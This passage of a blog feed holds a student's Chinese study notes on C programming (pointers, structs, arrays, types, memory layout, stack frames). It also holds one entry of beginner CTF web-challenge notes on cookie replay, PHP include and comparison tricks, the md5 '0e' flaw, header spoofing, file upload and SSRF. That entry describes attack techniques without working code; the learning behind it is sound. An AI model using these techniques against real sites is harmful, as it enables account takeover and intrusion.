    <content type="html"><![CDATA[<h1 id="remake-指针"><a href="#remake-指针" class="headerlink" title="/remake 指针"></a>/remake 指针</h1><p>1.强制转换取地址的int变量</p><p>指针不能访问静态常量区</p><p>字符指针要注意指向的是字符还是字符串，用遍历字符串的方式来去访问字符会导致内存访问越界</p><p>sizeof（*p）：指针对应类型的长度</p><h1 id="remake-结构体"><a href="#remake-结构体" class="headerlink" title="/remake 结构体"></a>/remake 结构体</h1><p>结构体格式</p><p>typedef struct student</p><p>{</p><p>   变量；</p><p>变量</p><p>}student ,*pstudent;(这里是变量声明)</p><p>结构体外指针指向格式</p><p>1.student *ps1=&s1;</p><p> 疑问:strcpy</p><p>结构体用指针变量来当结构体变量</p><p>1.只试了char类型指针，int类型指针老是报错，char类型记得输出要%s</p><p>疑问1：为什么我int类型指针在结构体里面老是报错</p><p>疑问2：如何修改结构体内容</p><p>结构体中有指针必须要指定内存</p><p>疑问：s2.birth = (date*)malloc(sizeof(date));</p><p>为什么初始化指针内存需要date<em>（如果char</em>  *  是这样的话，那是不是int * 也能这样成功初始化分配内存）</p><p>if (s2-&gt;name = NULL)</p><p>这个应该是避免指针为空变成野指针？</p><p>如果代码结构体中有n个指针，要进行n次内存分配和初始化</p><p>结构体 多项指向</p><p>s2-&gt;birth-&gt;year = 1997</p><p>这种是得要s2也是个指针，指向结构体student</p><p>结构体 链表与树</p><p>初步理解：链表：它应该是结构体中有一个指向小结构体的指针（但是在结构体中只有一个）</p><p>树：它是结构体中有两个指向相同类型小结构体的指针（因此叫树）</p><p>16：42 疑问数组需要分配内存空间吗？</p><p>不是这个问题，对于结构体数组名来说是不能直接进行赋值修改的</p><p>因此要使用strcpy_s来对这里面数组进行赋值</p><h1 id="汇编之函数调用"><a href="#汇编之函数调用" class="headerlink" title="汇编之函数调用"></a>汇编之函数调用</h1><p>断点中断指令0ccccch 会来填充临时变量</p><p>先push压存入变量占据内存空间入栈，接着函数调用形成eip（函数返回地址）然后esp本来是存放栈顶地址的，EBP存储着当前<a href="https://www.k2zone.cn/?tag=%E5%87%BD%E6%95%B0%E6%A0%88">函数栈</a>底的地址，ebp被压入栈，ebp被esp赋值，esp开始向上弹空间（一开始esp也会向上移动字节长的空间），这段空间是函数里面是函数局部变量空间， 然后系统会放入三个寄存器ebx，esi，edi，（系统并无备份，准备随时拿来用的），然后将局部变量空间赋值成ccc（断点指令）想加完后，执行寄存器出栈，出完后，esp到栈顶，然后esp被和ebp地址相同，esp就到了ebp的位置，然ebp被pop，老ebp就走到ebp地址去，esp就走到eip出栈，</p><p>call完后main函数里面调用者会清理</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>10-9</title>
    <link href="/2021/10/09/10-9/"/>
    <url>/2021/10/09/10-9/</url>
    
    <content type="html"><![CDATA[<h1 id="数组重要注意事项"><a href="#数组重要注意事项" class="headerlink" title="数组重要注意事项"></a>数组重要注意事项</h1><h2 id="amp-数组和数组的差别"><a href="#amp-数组和数组的差别" class="headerlink" title="&amp;数组和数组的差别"></a>&amp;数组和数组的差别</h2><h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><ul><li>数组代表的是一行部分元素</li><li>&amp;数组代表的是一整个数组</li></ul><h3 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h3><ul><li><p>数组和&amp;区别</p><ul><li>数组包含的是一个被定义的部分数组元素类型的字节</li><li>&amp;数组包含的是一整个数组类型字节</li></ul></li></ul><h2 id="数组做参数"><a href="#数组做参数" class="headerlink" title="数组做参数"></a>数组做参数</h2><h3 id="数组做参数传递函数，会退化成指针，但是值还是可以读取"><a href="#数组做参数传递函数，会退化成指针，但是值还是可以读取" class="headerlink" title="数组做参数传递函数，会退化成指针，但是值还是可以读取"></a>数组做参数传递函数，会退化成指针，但是值还是可以读取</h3><h2 id="数组溢出"><a href="#数组溢出" class="headerlink" title="数组溢出"></a>数组溢出</h2><h1 id="二维数组-1"><a href="#二维数组-1" class="headerlink" title="二维数组"></a>二维数组</h1><h2 id="二维数组初始化"><a href="#二维数组初始化" class="headerlink" title="二维数组初始化"></a>二维数组初始化</h2><h3 id="先行后列"><a href="#先行后列" class="headerlink" title="先行后列"></a>先行后列</h3><h2 id="二维数组的遍历"><a href="#二维数组的遍历" class="headerlink" title="二维数组的遍历"></a>二维数组的遍历</h2><h3 id="C语言中是以先行后列的方式来进行编译的，所以遍历最好一样，否则数据过大，导致效率变慢"><a href="#C语言中是以先行后列的方式来进行编译的，所以遍历最好一样，否则数据过大，导致效率变慢" class="headerlink" title="C语言中是以先行后列的方式来进行编译的，所以遍历最好一样，否则数据过大，导致效率变慢"></a>C语言中是以先行后列的方式来进行编译的，所以遍历最好一样，否则数据过大，导致效率变慢</h3><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>10-8</title>
    <link href="/2021/10/08/10-8/"/>
    <url>/2021/10/08/10-8/</url>
    
    <content type="html"><![CDATA[<h1 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h1><p>位或就是按两个数转为二进制只要对应起来只要有一个1的结果位就为1（参用补码进行运算）</p><p>&amp; 按位与, | 按位或 , ^ 按位异或</p><p>AND (位与&amp;) OR ( 位或| ) XOR ( 位异或^ )</p><p>1 &amp; 1 = 1， 1 | 1 = 1， 1 ^ 1 = 0</p><p>1 &amp; 0 = 0， 1 | 0 = 1， 1 ^ 0 = 1</p><p>0 &amp; 1 = 0， 0 | 1 = 1， 0 ^ 1 = 1</p><p>0 &amp; 0 = 0， 0 | 0 = 0， 0 ^ 0 = 0</p><p>其实翻译起来也就是位与就是有0就是0，全1才不是0；</p><p>位或是有1就是1，全0才是0；</p><p>异或是有相同就是0，相异就是1.</p><p>周哥之c语言之运算符作业</p><p>**1.**代码1是将变量值放在右边，这样如果程序出错时，便于程序报错</p><p>代码2时将变量值放在左边，是将赋给变量值为null</p><p>而null再C语言中有时也不仅仅表示为0，还能表示为空指针</p><p>也就是说代码1，2可以是空指针被赋，或者赋给了变量</p><p><strong>2</strong>.5对a来取整在等于a，5xa再等于a</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>10-7</title>
    <link href="/2021/10/07/10-7/"/>
    <url>/2021/10/07/10-7/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/10/07/10-7/2.png" alt="10-7"></p><h2 id="数组的特性"><a href="#数组的特性" class="headerlink" title="数组的特性"></a>数组的特性</h2><h3 id="元素个数不能用变量，可以用常变量，甚至常量表达式（原因应是常量表达式在编译阶段即已经确定值）"><a href="#元素个数不能用变量，可以用常变量，甚至常量表达式（原因应是常量表达式在编译阶段即已经确定值）" class="headerlink" title="元素个数不能用变量，可以用常变量，甚至常量表达式（原因应是常量表达式在编译阶段即已经确定值）"></a>元素个数不能用变量，可以用常变量，甚至常量表达式（原因应是常量表达式在编译阶段即已经确定值）</h3><h3 id="在内存当中处于连续性排列"><a href="#在内存当中处于连续性排列" class="headerlink" title="在内存当中处于连续性排列"></a>在内存当中处于连续性排列</h3><h3 id="支持随机访问"><a href="#支持随机访问" class="headerlink" title="支持随机访问"></a>支持随机访问</h3><h3 id="数组溢出编译器不会报错"><a href="#数组溢出编译器不会报错" class="headerlink" title="数组溢出编译器不会报错"></a>数组溢出编译器不会报错</h3><h3 id="思考-在大型数据中，数组是否比链表更为有效率"><a href="#思考-在大型数据中，数组是否比链表更为有效率" class="headerlink" title="思考:在大型数据中，数组是否比链表更为有效率"></a>思考:在大型数据中，数组是否比链表更为有效率</h3><h2 id="一维数组的初始化"><a href="#一维数组的初始化" class="headerlink" title="一维数组的初始化"></a>一维数组的初始化</h2><h3 id="初始化中列表数字不够元素数值的，一律被0填充"><a href="#初始化中列表数字不够元素数值的，一律被0填充" class="headerlink" title="初始化中列表数字不够元素数值的，一律被0填充"></a>初始化中列表数字不够元素数值的，一律被0填充</h3><h3 id="逗号表达式，先算逗号括号里面数值，再来进行数组数字赋值"><a href="#逗号表达式，先算逗号括号里面数值，再来进行数组数字赋值" class="headerlink" title="逗号表达式，先算逗号括号里面数值，再来进行数组数字赋值"></a>逗号表达式，先算逗号括号里面数值，再来进行数组数字赋值</h3><h3 id="未进行元素个数赋值，可以让数字反对元素个数进行定义"><a href="#未进行元素个数赋值，可以让数字反对元素个数进行定义" class="headerlink" title="未进行元素个数赋值，可以让数字反对元素个数进行定义"></a>未进行元素个数赋值，可以让数字反对元素个数进行定义</h3><h3 id="数组只能在初始化进行直接赋值，后面只能加循环或者函数进行间接赋值"><a href="#数组只能在初始化进行直接赋值，后面只能加循环或者函数进行间接赋值" class="headerlink" title="数组只能在初始化进行直接赋值，后面只能加循环或者函数进行间接赋值"></a>数组只能在初始化进行直接赋值，后面只能加循环或者函数进行间接赋值</h3><h2 id="数组遍历"><a href="#数组遍历" class="headerlink" title="数组遍历"></a>数组遍历</h2><h3 id="将每个元素在内存中跑一遍罢了"><a href="#将每个元素在内存中跑一遍罢了" class="headerlink" title="将每个元素在内存中跑一遍罢了"></a>将每个元素在内存中跑一遍罢了</h3><h3 id="用sizeof数组-sizeof数组-0-来计算数组里面元素个数"><a href="#用sizeof数组-sizeof数组-0-来计算数组里面元素个数" class="headerlink" title="用sizeof数组/sizeof数组[0]来计算数组里面元素个数"></a>用sizeof数组/sizeof数组[0]来计算数组里面元素个数</h3><h2 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h2><h3 id="字符数组：单纯的每个字符"><a href="#字符数组：单纯的每个字符" class="headerlink" title="字符数组：单纯的每个字符"></a>字符数组：单纯的每个字符</h3><h3 id="字符串数组：-0往往会作为一个数组结尾"><a href="#字符串数组：-0往往会作为一个数组结尾" class="headerlink" title="字符串数组：\0往往会作为一个数组结尾"></a>字符串数组：\0往往会作为一个数组结尾</h3><h3 id="strlen寻找数组长度：寻找字符串数组中非0元素的长度"><a href="#strlen寻找数组长度：寻找字符串数组中非0元素的长度" class="headerlink" title="strlen寻找数组长度：寻找字符串数组中非0元素的长度"></a>strlen寻找数组长度：寻找字符串数组中非0元素的长度</h3><h3 id="sizeof：单纯计算元素长度"><a href="#sizeof：单纯计算元素长度" class="headerlink" title="sizeof：单纯计算元素长度"></a>sizeof：单纯计算元素长度</h3><p>自答:</p><p><img src="/2021/10/07/10-7/1.png" alt="10-7"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>10-6</title>
    <link href="/2021/10/06/10-6/"/>
    <url>/2021/10/06/10-6/</url>
    
    <content type="html"><![CDATA[<h1 id="周哥C语言之变量作用域，存储空间，生命周期"><a href="#周哥C语言之变量作用域，存储空间，生命周期" class="headerlink" title="周哥C语言之变量作用域，存储空间，生命周期"></a>周哥C语言之变量作用域，存储空间，生命周期</h1><h2 id="系统内存空间"><a href="#系统内存空间" class="headerlink" title="系统内存空间"></a>系统内存空间</h2><h3 id="内核空间"><a href="#内核空间" class="headerlink" title="内核空间"></a>内核空间</h3><ul><li>拥有最高权限，进行系统调用，可以短暂代替进程</li></ul><h3 id="64kb非法区域"><a href="#64kb非法区域" class="headerlink" title="64kb非法区域"></a>64kb非法区域</h3><ul><li>将内核空间与进程空间隔开</li></ul><h3 id="进程空间"><a href="#进程空间" class="headerlink" title="进程空间"></a>进程空间</h3><ul><li>给每个应用分配进程</li></ul><h3 id="64kb-null空间"><a href="#64kb-null空间" class="headerlink" title="64kb null空间"></a>64kb null空间</h3><ul><li>无法访问(应该是系统为了各种指针乱闯特定划分的一个空间吧，用来保护系统）</li></ul><h2 id="程序内存布局"><a href="#程序内存布局" class="headerlink" title="程序内存布局"></a>程序内存布局</h2><h3 id="栈空间"><a href="#栈空间" class="headerlink" title="栈空间"></a>栈空间</h3><ul><li><p>应用栈</p><ul><li>默认编译指令/stack(思:通过不断扩张应用栈，来导致栈溢出，Linux可以通过ulimit -s来修改应用层内核栈</li></ul></li><li><p>内核栈</p><ul><li>随CPU架构而定</li></ul></li></ul><h3 id="空闲区"><a href="#空闲区" class="headerlink" title="空闲区"></a>空闲区</h3><h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><h2 id="变量生命周期"><a href="#变量生命周期" class="headerlink" title="变量生命周期"></a>变量生命周期</h2><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><ul><li>作用域：整个程序</li><li>存储空间：静态区</li><li>生命周期：整个程序运行期间</li></ul><h3 id="全局静态变量"><a href="#全局静态变量" class="headerlink" title="全局静态变量"></a>全局静态变量</h3><ul><li>作用域：当前源文件</li><li>存储空间：静态区</li><li>生命周期：整个程序运行期间</li></ul><h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><ul><li>作用域：函数内部</li><li>存储空间：栈</li><li>生命周期：函数执行期间</li></ul><h3 id="局部静态变量"><a href="#局部静态变量" class="headerlink" title="局部静态变量"></a>局部静态变量</h3><ul><li>作用域：函数内部</li><li>存储空间：静态区</li><li>生命周期：整个程序运行期间</li></ul><h3 id="寄存器变量"><a href="#寄存器变量" class="headerlink" title="寄存器变量"></a>寄存器变量</h3><ul><li>作用域：函数内部</li><li>存储空间：寄存器</li><li>生命周期：函数执行期间</li></ul><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><h3 id="思考：虽然内核栈空间很小，但是应用栈不是我可不断编译增加的吗？我是不是可以用应用栈来破坏内核栈，来执行栈溢出，这样算不算可以绕过栈保护"><a href="#思考：虽然内核栈空间很小，但是应用栈不是我可不断编译增加的吗？我是不是可以用应用栈来破坏内核栈，来执行栈溢出，这样算不算可以绕过栈保护" class="headerlink" title="思考：虽然内核栈空间很小，但是应用栈不是我可不断编译增加的吗？我是不是可以用应用栈来破坏内核栈，来执行栈溢出，这样算不算可以绕过栈保护"></a>思考：虽然内核栈空间很小，但是应用栈不是我可不断编译增加的吗？我是不是可以用应用栈来破坏内核栈，来执行栈溢出，这样算不算可以绕过栈保护</h3><h3 id="思考：那pae是否是越多越好呢？有无在x86处理器中有什么限制呢？"><a href="#思考：那pae是否是越多越好呢？有无在x86处理器中有什么限制呢？" class="headerlink" title="思考：那pae是否是越多越好呢？有无在x86处理器中有什么限制呢？"></a>思考：那pae是否是越多越好呢？有无在x86处理器中有什么限制呢？</h3><p>自我解答：是因为x86处理器增加的额外的地址线和增加的存储器，不过看到页表结构中</p><h3 id="data数据段是存放已经初始化好的全局变量和静态变量，这样的话，算不算C语言里面的数组元素也算一个个变量（毕竟数组也有初始化）"><a href="#data数据段是存放已经初始化好的全局变量和静态变量，这样的话，算不算C语言里面的数组元素也算一个个变量（毕竟数组也有初始化）" class="headerlink" title=".data数据段是存放已经初始化好的全局变量和静态变量，这样的话，算不算C语言里面的数组元素也算一个个变量（毕竟数组也有初始化）"></a>.data数据段是存放已经初始化好的全局变量和静态变量，这样的话，算不算C语言里面的数组元素也算一个个变量（毕竟数组也有初始化）</h3><h2 id="静态区"><a href="#静态区" class="headerlink" title="静态区"></a>静态区</h2><h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="/2021/10/06/10-6/2.png" alt="10-6"></p><p><strong>资料</strong></p><p><img src="/2021/10/06/10-6/1.png" alt="10-6"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>10-5</title>
    <link href="/2021/10/05/10-5/"/>
    <url>/2021/10/05/10-5/</url>
    
    <content type="html"><![CDATA[<h1 id="周哥之数据类型之整型取值范围"><a href="#周哥之数据类型之整型取值范围" class="headerlink" title="周哥之数据类型之整型取值范围"></a>周哥之数据类型之整型取值范围</h1><p><img src="/2021/10/05/10-5/1.png" alt="10-5"></p><p>有符号位最高位正数的话肯定是0，所以有效数字是最高位的次位，应该是n-2</p><p>而有符号位负数的话是将最高位直接+1了，消去了数列求和的-1</p><h1 id="周哥之数据类型之强制转换"><a href="#周哥之数据类型之强制转换" class="headerlink" title="周哥之数据类型之强制转换"></a>周哥之数据类型之强制转换</h1><p>两个字节一个字</p><p>字节相同转为无符号</p><p>浮点运算都要变为双精度double来进行运算</p><p>Char和short运算相同变为int来进行运算</p><p>自动转换运算表达式会以最长位类型为主来进行运算</p><p>函数调用实参先会被转换为形参的类型后，再赋予形参</p><h1 id="周哥之变量定义与命名"><a href="#周哥之变量定义与命名" class="headerlink" title="周哥之变量定义与命名"></a>周哥之变量定义与命名</h1><p>知道变量就可以知道变量在内存中被分配的的地址和在内存中可以存放的数据</p><p><strong>思考：那么是不是re题当中flag就藏在其中一个变量内存地址中里面，里面存放着这个这个变量在内存中的数据（未成想过的路，能不能写个与ida配套的脚本&amp;变量并打印变量在寄存器中的值）</strong></p><p>这样的话就可以解释几个flag都是在寄存器的原因</p><p>大多数ansi编译程序允许至少有31个有效字符，也就是说只有前31个有效字符唯一性会被确定，那是不是在超过了31位可以创造一个即可以满足第一个if，还能满足第二个if函数的变量</p><p>课后查询：ansi时一种让c语言标准化并使计算机扩展更多语言的计算机字符代码</p><h1 id="周哥之变量定义与命名作业"><a href="#周哥之变量定义与命名作业" class="headerlink" title="周哥之变量定义与命名作业"></a>周哥之变量定义与命名作业</h1><p>1.&amp;变量 %p内存地址</p><p>2.变量在内存的地址，变量在内存中的数据</p><p>3.float </p><p>4.3value</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>10-4</title>
    <link href="/2021/10/04/10-4/"/>
    <url>/2021/10/04/10-4/</url>
    
    <content type="html"><![CDATA[<h1 id="周哥之内建型别作业"><a href="#周哥之内建型别作业" class="headerlink" title="周哥之内建型别作业"></a>周哥之内建型别作业</h1><p>1.有int short long double bool  char wchar_t long long   _int64 </p><p>2.以这样的格式”typedef int INT;” </p><p>3.字符编码分为ascii码和unicode ascii只是为了计算机语言 而unicode是为了所有语言可以计算机的方式展现出来 utf-8 utf-16 utf-32 一般是web网站是以utf-8来进行编码</p><p>因为另外两个编码方式会拖延用户访问网站的速度</p><p>4.一个是ascii字符 一个是unicode字符</p><p>5.0代表的是数值0，‘0‘代表的是0的ascii码值</p><p>Null也就是void把空指针</p><p>“0”是字符串0的意思</p><p>5.尾数和阶码同时为0 （思考：那这样说尾数是0指数=-127才是等于0）</p><h1 id="类型长度与取值范围"><a href="#类型长度与取值范围" class="headerlink" title="类型长度与取值范围"></a>类型长度与取值范围</h1><p>思考：X86架构和x架构系统有什么区别</p><p><img src="/2021/10/04/10-4/1.png" alt="10-4"></p><p>也就是说x86是更偏向于对32位的cpu进行操作</p><p>而x64是更偏向于64位的cpu进行操作</p><p><strong>要小心数据溢出</strong> 有可能会造成安全漏洞</p><h1 id="类型长度与取值范围作业"><a href="#类型长度与取值范围作业" class="headerlink" title="类型长度与取值范围作业"></a>类型长度与取值范围作业</h1><ol><li>sizeof运算符，编译阶段</li><li>i=0；i=-1（一开始还以为这个只是单独的i=65535）</li><li>-128</li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>10-3-1</title>
    <link href="/2021/10/03/10-3-1/"/>
    <url>/2021/10/03/10-3-1/</url>
    
    <content type="html"><![CDATA[<h1 id="内建型别"><a href="#内建型别" class="headerlink" title="内建型别"></a>内建型别</h1><p>Wchar_是用来存储unicoede码的  </p><p>Long数据类型在不同平台对应的字节是不同的，这点我感觉可能会导致数组运算，或者数据溢出时出现错误</p><p>Signed unsigned 默认是有符号的</p><p>布尔类型</p><p><strong>思考：布尔运算和if又有何区别有何优势呢，意义上不一样？就像switch语句是多用来多路判定，if是多用来条件判定，bool多用来逻辑判定？ascii字符前加个L是unicode字符</strong></p><p>Char name【16】=”tom’‘</p><p><strong>思考：对数组来说的，是不是这name数组内16个元素都是char类型</strong></p><p><strong>字节是数据空间的一种计量单位</strong></p><p><strong>字符是计算机中使用的文字和符号</strong></p><p>要分清这种区别</p><p>I64分为八个字节的整数</p><p>Linux和window这些不同平台分别定义的数据包类型，可以让c语言程序可移植性高（我觉得还有平台代码辨识性会高）</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>10-2</title>
    <link href="/2021/10/02/10-2/"/>
    <url>/2021/10/02/10-2/</url>
    
    <content type="html"><![CDATA[<p><strong>HTML source</strong> </p><p>每次都要看一次源代码看看有无提示</p><h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><p>COOKies 是网站对用户进行认证的一种令牌</p><p>如果能成功窃取并重放用户的cookie，就能在获得用户账号的权限</p><h2 id="location"><a href="#location" class="headerlink" title="location"></a>location</h2><p>网站·重定向</p><p> 200是成功</p><p>300是重定向、</p><p>400是访问失败</p><h2 id="Get-Post"><a href="#Get-Post" class="headerlink" title="Get_Post"></a>Get_Post</h2><p><img src="/2021/10/02/10-2/getpost.png" alt="10-2"></p><p>其实可以理解成一种数组内的参数传递传递</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">highlight_file<span class="hljs-string">``</span>是突出文字体<br></code></pre></td></tr></table></figure><h2 id="babyrce"><a href="#babyrce" class="headerlink" title=" babyrce"></a><code> </code>babyrce</h2><p><img src="/2021/10/02/10-2/babyrce.png" alt="10-2"></p><p>request语句可以被输入机制传递给网站，然后执行</p><h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><p><img src="/2021/10/02/10-2/ezinclude.png" alt="10-2"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">error_reporting<span class="hljs-string">``</span>(<span class="hljs-string">``</span><span class="hljs-number">0</span><br>语句是一个错误不回显语句<br>函数<span class="hljs-keyword">include</span><br>可以将别的文件包含进来甚至可以进行执行<br></code></pre></td></tr></table></figure><h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p><img src="/2021/10/02/10-2/babyphp.png" alt="10-2"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">强等于和弱等于的考察，<span class="hljs-built_in">int</span>val（数量值，<span class="hljs-number">0</span>）其中<span class="hljs-number">0</span>是十进制了，<span class="hljs-number">0</span>x是<span class="hljs-number">16</span>进制<br>以<span class="hljs-number">0</span>开始时八进制，他是输入强等于让第一次cidp===<span class="hljs-number">11775</span>跳过，再让强等于可以丢失的<span class="hljs-number">11775</span>语句来触发<span class="hljs-built_in">int</span>val<br></code></pre></td></tr></table></figure><h2 id="babyphp2"><a href="#babyphp2" class="headerlink" title="babyphp2"></a>babyphp2</h2><p><img src="/2021/10/02/10-2/babyphp2.png" alt="10-2"></p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-built_in">md5</span>``是个现有缺陷的加密算法，使得明文很难解密回去，非对称算法，可能一个字母会有两个解，因此使解密困难重重<br>原题使用<span class="hljs-built_in">md5</span>强比较，通过post传参<br>但密文<span class="hljs-number">0</span>e开头进行强比较会都是<span class="hljs-number">0</span>；所以存在漏洞<br></code></pre></td></tr></table></figure><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">http``不同的协议规定<br>厂家大多使用`**X-Forwarded-For**`  client-ip``来进行是哪个网站过来的判定<br><span class="hljs-title">考点:</span>伪造各种请求来实现“伪用户”实现登录的目的<br> <br></code></pre></td></tr></table></figure><h2 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h2><p>文件上传防御办法：强制将文件先改重命名再进行上传</p><p>使用php的网站如果收到php代码文件会直接执行</p><h2 id="babyssrf"><a href="#babyssrf" class="headerlink" title="babyssrf"></a>babyssrf</h2><p>是一个可以从外网去攻破内网的漏洞，因为漏洞请求是从服务端进行的，</p><p>攻击者可以通过一个与外网相连的内网系统，来去在内网执行漏洞</p><p>想法:在网上看到大多数漏洞点都跟url有关，能不能通过限制每个应用调用url的功能权限来达到一定程度上的防御ssrf</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>10-1</title>
    <link href="/2021/10/01/10-1/"/>
    <url>/2021/10/01/10-1/</url>
    
